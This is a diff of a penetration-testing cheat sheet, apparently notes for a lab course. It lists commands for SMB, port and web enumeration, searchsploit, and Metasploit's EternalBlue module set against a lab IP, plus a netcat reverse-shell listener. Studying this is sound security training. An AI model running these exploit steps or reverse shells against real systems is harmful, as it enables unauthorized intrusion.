@@ -12,7 +12,6 @@
 > - **Connect to a SMB Share **  smbclient \\\\10.129.42.253\\users
 > - **Grab banner of an open port **  netcat 10.10.10.10 22
 > - **Grab banner of an open port **  netcat 10.10.10.10 22
-> - 
 
   
 ## WEB Enumb
@@ -21,6 +20,24 @@
 > - **List potential directories** curl 10.10.10.121/robots.txt
 > - **grab website banner** curl -IL https://www.inlanefreight.com
 > - **List details about webserver/certs** whatweb 10.10.10.121
+
+
+## Exploit Scan
+> - **Install exploitdb tool** sudo apt install exploitdb -y
+> - **Search for public exploits for a web application** searchsploit openssh 7.2
+### Metasploit
+Metasploit Framework (MSF) contains exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets
+> - **MSF: Start the Metasploit Framework** msfconsole
+> - **Search for public exploits in MSF** search exploit eternalblue
+> - **Start using an MSF module** use exploit/windows/smb/ms17_010_psexec
+> - **Show required options for an MSF module** show options
+> - **Set a value for an MSF module option** set RHOSTS 10.10.10.40
+> - **Test if the target server is vulnerable** check
+> - **Run the exploit on the target server is vulnerable** exploit
+
+
+
+
 > - 
   > whatweb --no-errors 10.10.10.0/24
   # 
@@ -56,18 +73,7 @@
   
 
   
-## Exploit Scan
-  # sudo apt install exploitdb -y
-  > searchsploit openssh 7.2
-  ## Metasploit
-  # Metasploit Framework (MSF) contains exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets
-  > msfconsole
-    > search exploit eternalblue
-    > use exploit/windows/smb/ms17_010_psexec
-    > set RHOSTS 10.10.10.40
-    > check
-    > exploit
-  
+
 ## Reverse Shell
   # on my computer
   > nc -lvnp 1234
